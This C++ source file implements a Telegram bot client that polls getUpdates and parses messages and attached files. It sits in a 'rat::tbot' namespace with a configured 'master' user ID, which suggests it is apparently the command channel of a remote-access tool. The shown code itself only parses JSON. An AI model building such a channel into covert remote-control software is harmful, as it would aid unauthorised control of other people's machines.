/* rat_tbot/src/Bot.cpp */
#include "rat/tbot/debug.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/tbot/types.hpp"

#include <fmt/core.h>
#include <simdjson.h>

namespace rat::tbot {

Bot::Bot(const std::string &arg_Token, const int64_t &Master_Id,
         uint8_t Telegram_Connection_Timeout, const std::string &Url_Endpoint) {
	this->token = std::move(arg_Token);
	this->master_id = std::move(Master_Id);
	this->curl_client = ::rat::networking::Client();

	this->setServerApiUrl(Url_Endpoint);
	this->update_interval = 1000;
	this->last_update_id = 0;

	this->getting_update_url = fmt::format(
	    "{}/bot{}/getUpdates?timeout={}&limit=1", this->server_api_url,
	    arg_Token, Telegram_Connection_Timeout);
}

File Bot::parseFile(simdjson::ondemand::value &&file_val,
                    const std::string &type) {
	File file;

		try {
			simdjson::ondemand::object file_obj = file_val.get_object();

			    // File ID (required)
				if(auto res = file_obj["file_id"].get_string();
				   res.error() == simdjson::SUCCESS) {
					file.id = std::string(res.value());
				}
				else {
					TBOT_ERROR_LOG("Missing file_id in {}", type);
					return file;
				}

			    // File size (optional)
				if(auto res = file_obj["file_size"].get_uint64();
				   res.error() == simdjson::SUCCESS) {
					file.size = res.value();
				}

			    // MIME type (optional / default by type)
				if(auto res = file_obj["mime_type"].get_string();
				   res.error() == simdjson::SUCCESS) {
					file.mime_type = std::string(res.value());
				}
				else {
					if(type == "photo")
						file.mime_type = "image/jpeg";
					else if(type == "audio")
						file.mime_type = "audio/mpeg";
					else if(type == "video")
						file.mime_type = "video/mp4";
					else if(type == "voice")
						file.mime_type = "audio/ogg";
					else
						file.mime_type = "application/octet-stream";
				}

			    // File name (optional, mostly documents)
				if(auto res = file_obj["file_name"].get_string();
				   res.error() == simdjson::SUCCESS) {
					file.name = std::string(res.value());
				}
		}
		catch(const simdjson::simdjson_error &e) {
			TBOT_ERROR_LOG("File parsing failed: {}", e.what());
		}

	return file;
}

void Bot::extractFilesFromMessage(simdjson::ondemand::object &message_obj,
                                  Message &message) {
		if(auto val = message_obj["document"];
		   val.error() == simdjson::SUCCESS) {
			message.files.push_back(
			    parseFile(std::move(val.value()), "document"));
		}

		if(auto val = message_obj["photo"]; val.error() == simdjson::SUCCESS) {
				for(auto photo_size : val.value()) {
					message.files.push_back(
					    parseFile(std::move(photo_size), "photo"));
				}
		}

		if(auto val = message_obj["audio"]; val.error() == simdjson::SUCCESS) {
			message.files.push_back(parseFile(std::move(val.value()), "audio"));
		}

		if(auto val = message_obj["video"]; val.error() == simdjson::SUCCESS) {
			message.files.push_back(parseFile(std::move(val.value()), "video"));
		}

		if(auto val = message_obj["voice"]; val.error() == simdjson::SUCCESS) {
			message.files.push_back(parseFile(std::move(val.value()), "voice"));
		}
}

Message Bot::parseMessage(simdjson::ondemand::value &message_val) {
	Message message{};

		try {
			simdjson::ondemand::object message_obj = message_val.get_object();

				if(auto res = message_obj["message_id"].get_int64();
				   res.error() == simdjson::SUCCESS) {
					message.id = res.value();
				}
				else {
					TBOT_ERROR_LOG("Missing message_id");
					return message;
				}

				if(auto from_obj = message_obj["from"].get_object();
				   from_obj.error() == simdjson::SUCCESS) {
						if(auto res = from_obj.value()["id"].get_int64();
						   res.error() == simdjson::SUCCESS) {
							message.origin = res.value();
						}
				}

				if(auto res = message_obj["text"].get_string();
				   res.error() == simdjson::SUCCESS) {
					message.text = std::string(res.value());
				}

			    // Caption (optional)
				if(auto res = message_obj["caption"].get_string();
				   res.error() == simdjson::SUCCESS) {
					message.caption = std::string(res.value());
				}

			extractFilesFromMessage(message_obj, message);
		}
		catch(const simdjson::simdjson_error &e) {
			TBOT_ERROR_LOG("Message parsing failed: {}", e.what());
		}

	return message;
}

Update Bot::parseJsonToUpdate(std::vector<char> &&arg_Buffer) {
	Update update{};
		try {
			simdjson::ondemand::parser simdjson_parser;
			const size_t &buffer_size = arg_Buffer.size();
			const size_t json_size = buffer_size - simdjson::SIMDJSON_PADDING;
				if(json_size == 0) {
					TBOT_ERROR_LOG("Empty Json response meaning this is either "
					               "offline or failure at endpoint");
					std::this_thread::sleep_for(std::chrono::seconds(2));
					return {};
				}
			auto doc = simdjson_parser.iterate(arg_Buffer.data(), json_size,
			                                   buffer_size);

				if(auto res = doc["ok"].get_bool();
				   res.error() != simdjson::SUCCESS || !res.value()) {
					TBOT_ERROR_LOG("API response not OK");
					return {};
				}

			auto result_val = doc["result"];
				if(result_val.error() != simdjson::SUCCESS) {
					TBOT_DEBUG_LOG("No result field in response");
					return {};
				}
			auto results = result_val.get_array();
				if(results.error() != simdjson::SUCCESS) {
					TBOT_DEBUG_LOG("Result is not an array");
					return {};
				}

				for(auto result_item : results.value()) {
					auto update_obj = result_item.get_object();
						if(update_obj.error() != simdjson::SUCCESS) {
							continue;
						}

						if(auto res =
						       update_obj.value()["update_id"].get_int64();
						   res.error() == simdjson::SUCCESS) {
							update.id = res.value();
							this->setLastUpdateId(update.id);
						}

					// message
					auto message_val = update_obj.value()["message"];
						if(message_val.error() == simdjson::SUCCESS) {
							update.message =
							    this->parseMessage(message_val.value());
						}

					break; // limit=1
				}
		}
		catch(const simdjson::simdjson_error &e) {
			TBOT_ERROR_LOG("JSON parsing failed: {}", e.what());
		}

	return update;
}

Update Bot::getUpdate() {
	const std::string url = fmt::format("{}&offset={}&limit=1",
	                                    getting_update_url, last_update_id + 1);

	TBOT_DEBUG_LOG("Polling updates with offset: {}", this->last_update_id + 1);

	std::vector<char> http_buffer;

	http_buffer.reserve(2 * 1024);

	const auto response =
	    this->curl_client.sendHttpRequest(url.c_str(), http_buffer);
		if(response.size == 0 || response.curl_code != CURLE_OK) {
			TBOT_ERROR_LOG("Empty http buffer, not going to be parsed");
			http_buffer.clear();
			std::this_thread::sleep_for(std::chrono::seconds(2));
			return {};
		}

	http_buffer.insert(http_buffer.end(), simdjson::SIMDJSON_PADDING, '\0');

	Update update = this->parseJsonToUpdate(std::move(http_buffer));

	return update;
}

} // namespace rat::tbot

#undef TBOT_DEBUG_LOG
#undef TBOT_ERROR_LOG
#ifdef DEBUG_RAT_TBOT
#undef DEBUG_RAT_TBOT
#endif
